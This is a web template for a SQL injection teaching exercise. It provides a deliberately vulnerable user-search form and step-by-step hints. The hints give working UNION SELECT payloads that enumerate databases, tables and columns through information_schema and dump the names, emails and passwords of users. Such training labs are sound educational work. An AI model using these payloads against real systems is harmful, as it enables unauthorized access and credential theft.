@extends('layouts.main')

<script>
  const showHint = (event) => {
    console.dir(event.target);
    event.target.parentNode.classList.remove('hidden');
  }

  document.addEventListener("DOMContentLoaded", function() {
    const hiddenHints = document.querySelectorAll('.step-hint.hidden');
    console.log(hiddenHints);
    hiddenHints.forEach(hiddenHint => hiddenHint.addEventListener('click', showHint));
  });
</script>

@section('content')
  <div class="instruction">
    <p>A SQL Injection attack exploits sites that let users query the database, usually via a form field.
    The strategy is to intercept the query that gets run in order to add your own query. This can let you view and manipulate data in the database and can lead to disastrous consequences for the site, including exposing user data, altering data, or even deleting data.</p>
  </div>

  @php
    //if (isset($found_users)) {
    //  var_dump($found_users);
    //}
  @endphp

  <div class="directions">
    <h2>Exercise Directions</h2>
    <p>Below you will find a list of directions on a way to control a database by intercepting the query being sent, a.k.a SQL Injection</p>
    <p>Follow the steps below and if you need it, click on a hint to reveal it</p>
  </div>

  <div class="exercise-container sql-injection-exercise-container">
    <div class="exercise">
      <h2>Find Users</h2>
      <form method="post" action="{{action('SqlInjectionController@findUsers')}}">
        <input type="hidden" name="_token" value="{{ csrf_token() }}">
        <div class="form-group">
          <label for="name">Name</label>
          <input type="text" id="name" name="name" value="{{$old_name or null}}" placeholder="Enter Name">
        </div>
        <button type="submit" value="Search" class="button">Search</button>
      </form>

      @if(isset($found_users))
        <p class="query">
          <span>
            Beginning part of query:
            <code class="large">{{ $found_users_beginning_query }}</code>
          </span>

          <span>
            User input of query:
            <code class="large">{{ $found_users_query_input }}</code>
          </span>

          <span>
            End part of query:
            <code class="large">{{ $found_users_end_query }}</code>
          </span>

          <span>
            Database query executed:
            <code class="large">{{ $found_users_query }}</code>
          </span>

        </p>

        <h3>Users Found</h3>
        @forelse ($found_users as $user)
          <p>{{ $user->name }}</p>
        @empty
          <p>No users found</p>
        @endforelse
      @endif
    </div>

    <div class="steps">
      <h2>Steps</h2>
      <ul>
        <li>
          <span class="step-title">1. Check if the query is possibly vulnerable to a SQL injection</span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Add a character that could interrupt the SQL statement</span></span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Put this in the search field: <code>"</code></span></span>
        </li>
        <li>
          <span class="step-title">2. Find all databases</span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Figure out a way to interrupt the query and add your own that gets all the databases</span></span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Did you know that <i>information_schema.schemata</i> holds the names of all the databases?</span></span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Put this in the search field: <code>" UNION SELECT schema_name AS name FROM information_schema.schemata WHERE "a"="a</code></span></span>
        </li>
        <li>
          <span class="step-title">3. Find all tables on the <i>class</i> database</span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Figure out a way to interrupt the query and add your own that gets all the tables</span></span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Did you know that <i>information_schema.tables</i> holds the names of all the tables from all databases?</span></span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Put this in the search field: <code>" UNION SELECT table_name AS name FROM information_schema.tables WHERE table_schema="class</code></span></span>
        </li>
        <li>
          <span class="step-title">4. Find all columns on the <i>users</i> table</span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Figure out a way to interrupt the query and add your own that gets all the columns in the <i>users</i> table</span></span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Did you know that <i>information_schema.columns</i> holds the names of all the columns from all databases?</span></span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Put this in the search field: <code>" UNION SELECT column_name AS name FROM information_schema.columns WHERE table_name="users" AND table_schema="class</code></span></span>
        </li>
        <li>
          <span class="step-title">5. Get data from all users on the <i>users</i> table</span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Figure out a way to interrupt the query and add your own that gets values for each user in <i>users</i> table</span></span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Did you know that the <i>concat()</i> method in MySQL will combine columns together?</span></span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Put this in the search field: <code>" UNION SELECT concat(name, " - ", email, ": ", password) AS name FROM class.users WHERE "a"="a</code></span></span>
        </li>
      </ul>
    </div>
  </div>

@endsection
